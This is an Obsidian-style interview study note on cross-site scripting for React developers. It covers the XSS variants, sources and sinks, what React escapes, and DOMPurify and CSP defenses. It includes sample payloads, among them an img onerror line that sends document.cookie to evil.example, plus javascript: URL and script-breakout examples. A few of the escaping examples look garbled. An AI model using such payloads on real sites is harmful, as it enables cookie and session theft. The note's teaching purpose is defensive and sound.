---
tags: [javascript, security, xss, react]
module: "20 - Network and Security"
priority: must-know
status: not-started
aliases: [Cross-Site Scripting]
---

# XSS

## Maturity Target

- Priority: #must-know
- Study time: 60-90 minutes
- Interview signal: you can distinguish reflected/stored/DOM-based XSS, explain exactly what React escapes and what it doesn't, and use `dangerouslySetInnerHTML` defensibly.
- Production signal: you can review a PR that renders user content and enumerate the injection sinks by name.
- Dependencies: [[19 - DOM and Browser APIs/01 - DOM Fundamentals and the Render Pipeline|DOM Fundamentals]], [[20 - Network and Security/04 - Cookies and Auth Patterns|Cookies and Auth Patterns]]

## Source Anchors

- [OWASP - Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
- [OWASP - XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [react.dev - dangerouslySetInnerHTML](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html)
- [MDN - Trusted Types API](https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API)
- [DOMPurify](https://github.com/cure53/DOMPurify)

## 1. Concept

XSS = attacker-controlled data executing as JavaScript in your users' browsers, inside your origin. Once running, the payload owns the page: it reads what the page can read (DOM, JS-accessible storage — [[19 - DOM and Browser APIs/05 - Browser Storage|Browser Storage]]), sends requests with the user's session, rewrites UI (fake login forms), and exfiltrates keystrokes. Same-origin policy doesn't help — the script *is* same-origin now.

Three variants, defined by where the payload lives:

- **Reflected**: payload in the request, echoed in the response. `search?q=<script>…` rendered as "Results for: <script>…". Delivered via crafted links.
- **Stored**: payload persisted server-side (comment, profile name, support ticket) and served to *every* viewer. Worst blast radius — including admins who view the content in an internal tool.
- **DOM-based**: never touches the server. Client JS reads an attacker-influenced *source* (`location.hash`, `search params`, `postMessage` data, even stored data) and writes it to a dangerous *sink* (`innerHTML`, `eval`). Fully visible only in frontend code review — which makes it *your* specialty as a frontend engineer.

## 2. Sources and Sinks — The Audit Vocabulary

**Sources** (attacker-influenced): URL parts (`location.search/hash/pathname`), `document.referrer`, `window.name`, `postMessage` payloads, API data containing user-generated content, storage another page/script wrote.

**Sinks** (where strings become code/markup):

```js
el.innerHTML = s;  el.outerHTML = s;  el.insertAdjacentHTML(pos, s);
document.write(s);
eval(s);  new Function(s);  setTimeout(s /* string form! */);
el.setAttribute("href", s);        // "javascript:alert(1)" URLs
scriptEl.src = s;  iframeEl.src = s;
```

Safe-by-construction counterparts: `textContent`, `setAttribute` for non-URL attributes, `createElement` + property assignment, and validated URL schemes for anything href/src-like.

## 3. What React Actually Protects (and What It Doesn't)

React escapes **text content and attribute values** interpolated into JSX — `{userInput}` becomes inert text, `<` turns into `&lt;`. That kills the classic injection *by default*, which is a real, major win.

React does **not** protect:

1. **`dangerouslySetInnerHTML`** — the name is the documentation.
2. **URL attributes**: `<a href={userUrl}>` with `javascript:alert(1)` — React escapes the *string*, but the string is a valid dangerous URL. (React warns and modern React blocks `javascript:` in more places, but treat URL validation as your job: allow `http(s):`/`mailto:`, or parse with `new URL` and check `.protocol`.)
3. **Escape hatches**: refs + manual `innerHTML`, third-party DOM libraries (chart tooltips with `html: true`, jQuery plugins), `<script>` content you assemble server-side, markdown renderers with `html: true`.
4. **SSR string assembly**: building HTML outside React (email templates, `res.send` interpolation) has no React protection at all — including injecting state as `<script>window.__STATE__ = ${JSON.stringify(state)}</script>`, where a `</script>` inside a string value breaks out (escape `<` as `<`).

## 4. Real Frontend Example: Bug → Fix → Tradeoff

Scenario: product reviews support markdown; a PR renders them.

Buggy version:

```jsx
import { marked } from "marked";

function Review({ review }) {
  // marked converts markdown → HTML, and passes raw inline HTML through
  return <div dangerouslySetInnerHTML={{ __html: marked(review.body) }} />;
}
```

Trace the stored XSS:

1. Attacker submits review: `Great phone! <img src=x onerror="fetch('https://evil.example/c?d='+encodeURIComponent(document.cookie))">`
2. Server stores it verbatim (it's "just text" at that layer).
3. Every visitor's browser renders the HTML: the broken `img` fires `onerror` → payload runs as your origin → session-riding, non-HttpOnly cookie theft, fake UI. Admins previewing reported reviews in the back office run it too — with admin sessions.

Production-safe fix — sanitize *after* markdown, at the last step before the sink:

```jsx
import { marked } from "marked";
import DOMPurify from "dompurify";

function Review({ review }) {
  const html = DOMPurify.sanitize(marked(review.body), {
    ALLOWED_TAGS: ["p", "br", "strong", "em", "code", "pre", "ul", "ol", "li", "a", "blockquote"],
    ALLOWED_ATTR: ["href"],
  });
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}
// Plus DOMPurify hooks/config to force rel="noopener noreferrer" and validated protocols on links.
```

Why sanitize-late: sanitizing *before* storage bakes one policy into your data forever (can't fix a bypass retroactively without re-migrating), breaks non-HTML consumers (mobile apps want raw markdown), and double-encodes on edit. Store raw; sanitize per render context. (Defense in depth: *also* validating on input is fine; relying on input validation alone is not.)

Tradeoffs: a strict allowlist strips legitimate content (tables? images? — every addition widens attack surface: `<img>` alone reintroduces `onerror` if attributes aren't tightly controlled); DOMPurify runs client-side per render (memoize; or sanitize server-side with JSDOM at write/read boundaries — but then coordinate the two contexts); and simplest of all, ask whether you need inline HTML in markdown at all — `marked` can disable raw HTML passthrough, and plain-text-only rendering (`textContent`) remains the zero-risk default when rich text isn't a requirement.

> [!tip] The last line of defense stack
> Assume a bypass will happen. CSP (`script-src` without `unsafe-inline`) stops injected inline scripts from executing ([[20 - Network and Security/06 - CSRF and CSP|CSRF and CSP]]); Trusted Types makes dangerous sinks reject raw strings platform-wide; HttpOnly keeps session tokens out of reach ([[20 - Network and Security/04 - Cookies and Auth Patterns|Cookies and Auth Patterns]]). Sanitization + CSP + Trusted Types + HttpOnly is the modern defense-in-depth answer.

## 5. DOM XSS Micro-Cases Worth Recognizing

```js
// 1. The hash tab router
const tab = location.hash.slice(1);
tabTitle.innerHTML = `Viewing: ${tab}`;        // #<img src=x onerror=...> → XSS
// fix: tabTitle.textContent = `Viewing: ${tab}`;

// 2. postMessage trust
window.addEventListener("message", (e) => {
  preview.innerHTML = e.data.html;             // ANY window can postMessage you
});
// fix: verify e.origin against an allowlist, then still sanitize.

// 3. The redirect param
loginBtn.href = params.get("next");            // javascript:… URL
// fix: allow only same-origin paths: new URL(next, location.origin).origin === location.origin
```

## Real-World Use Cases

### Search-term highlighting that highlights an exploit

Product asks for the classic "bold the matched query in results". The tempting implementation builds an HTML string — turning the search box (and the shareable `?q=` URL) into a reflected/DOM XSS source.

```jsx
// Vulnerable: the query flows into an HTML sink
function Highlight({ text, query }) {
  const html = text.replace(new RegExp(query, "gi"), (m) => `<mark>${m}</mark>`);
  return <span dangerouslySetInnerHTML={{ __html: html }} />;
}

// Safe: build React nodes — no HTML string ever exists
function Highlight({ text, query }) {
  if (!query) return text;
  const parts = text.split(new RegExp(`(${escapeRegExp(query)})`, "gi"));
  return parts.map((part, i) =>
    part.toLowerCase() === query.toLowerCase() ? <mark key={i}>{part}</mark> : part
  );
}
```

Section 3 exactly: JSX interpolation escapes text, so the node-based version cannot inject — the vulnerable one manufactures markup and hands it to a sink, opting out of React's protection for a feature that never needed HTML.

### The chart tooltip that runs user data

Dashboards name series after user-generated content (project names, customer names), and chart libraries happily render tooltips as HTML when asked:

```js
// Highcharts/ECharts-style config
tooltip: {
  useHTML: true,
  formatter() {
    return `<b>${this.series.name}</b>: ${this.y}`; // series.name = "Q3 <img src=x onerror=…>"
  },
},
```

React never sees this DOM — the library writes `innerHTML` internally, the "third-party escape hatch" from section 3. Fix: keep `useHTML` off unless required; otherwise escape or DOMPurify the interpolated fields at the formatter boundary.

> [!tip]
> PR-review heuristic: grep dependency configs for `html: true`, `useHTML`, `allowHTML`, `unsafeHTML`, `dangerously*` — each one is a sink your JSX audit won't show.

### Transactional emails assembled by string interpolation

A Node service sends "New comment from …" notification emails as HTML. A display name of `<img src=x onerror=…>` now executes wherever that HTML renders — including your own admin tools that preview reported emails in the browser.

```ts
import escapeHtml from "escape-html";

const html = `<p><b>${escapeHtml(comment.author)}</b> commented:</p>
<blockquote>${escapeHtml(comment.body)}</blockquote>`;
```

This is the "SSR string assembly" gap from section 3 with no React anywhere: every interpolation into an HTML context needs explicit escaping (or an auto-escaping template layer, e.g. JSX-to-email renderers). The same rule covers webhook payloads and CMS fragments rendered by other consumers.

## 6. Interview Answer

Short answer:

> XSS is attacker data executing as script in your origin — reflected via the request, stored via the database, or DOM-based when client code moves attacker-influenced input into a sink like `innerHTML`. React escapes JSX text and attributes by default, which kills the classic cases, but not `dangerouslySetInnerHTML`, `javascript:` URLs, or manual DOM writes.

Deeper answer:

> The audit model is sources to sinks: URL parts, postMessage, and user-generated API data flowing into innerHTML, eval-family, or URL attributes. Rich text is the hard case — store raw, render through a sanitizer allowlist like DOMPurify at the sink, and back it with CSP so a sanitizer bypass can't execute, Trusted Types to police sinks platform-wide, and HttpOnly so a successful payload can't exfiltrate the session credential. Escaping is context-specific — HTML text, attributes, URLs, and script contexts each have different rules, which is why "just escape it" isn't a policy.

## 7. Practice

1. <details><summary>Classify each: (a) `/search?q=<script>` echoed by the server into HTML; (b) a bio field that runs script for every profile viewer; (c) `el.innerHTML = decodeURIComponent(location.hash)`. Which one can a server-side WAF never fully see?</summary>(a) reflected, (b) stored, (c) DOM-based. The WAF can't reliably see (c): the fragment (`#…`) isn't even sent to the server, and the vulnerable data flow happens entirely in the browser. DOM XSS is found by auditing client code, not server logs.</details>

2. <details><summary>Why is `<div dangerouslySetInnerHTML={{ __html: userHtml }} />` not automatically a vulnerability, and what three questions decide it in review?</summary>The API is an explicit sink — it's a vulnerability only if the HTML is attacker-influenceable and unsanitized. Review questions: (1) Where does this HTML originate — trusted CMS authors, or any user? (2) Is it sanitized with an allowlist at this boundary (not just "on input, years ago")? (3) What's the fallback defense — CSP/Trusted Types — if the sanitizer is bypassed? Trusted-author CMS HTML with CSP is commonly accepted; user content without DOMPurify is a finding.</details>

3. <details><summary>An attacker steals sessions despite HttpOnly cookies via stored XSS. How? What limits remain?</summary>HttpOnly blocks *reading* the cookie, not *using* it: the payload issues same-origin fetches from the victim's browser — the browser attaches the cookie automatically — performing actions or pulling data and exfiltrating the responses. Limits: attacker acts only while a victim has the page open, can't replay the session from their own machine offline, and server-side anomaly detection/step-up auth for sensitive actions can catch the pattern. That residual risk is why XSS prevention itself, not token storage, is the primary defense.</details>

4. <details><summary>Your team injects Redux state into SSR HTML: `<script>window.__STATE__ = ${JSON.stringify(state)}</script>`. Exploit and fix.</summary>If any state string contains `</script><script>evil()</script>`, JSON.stringify preserves it literally; the HTML parser closes the script tag mid-string and executes the attacker's script — stored/reflected XSS depending on the state's source. Fix: escape for the script context — replace `<` with `<` (and ` / ` for old parsers), e.g. `JSON.stringify(state).replace(/</g, "\\u003c")`, or use a vetted serializer (this is what frameworks' built-in state serialization does; Next.js handles it for you — one more reason not to hand-roll SSR).</details>

## Related Notes

- [[20 - Network and Security/06 - CSRF and CSP|CSRF and CSP]]
- [[20 - Network and Security/04 - Cookies and Auth Patterns|Cookies and Auth Patterns]]
- [[19 - DOM and Browser APIs/05 - Browser Storage|Browser Storage]]
- [[14 - JavaScript in React and Next.js/01 - JavaScript Fundamentals in React|JavaScript Fundamentals in React]]
- [[01 - Roadmap|Roadmap]]
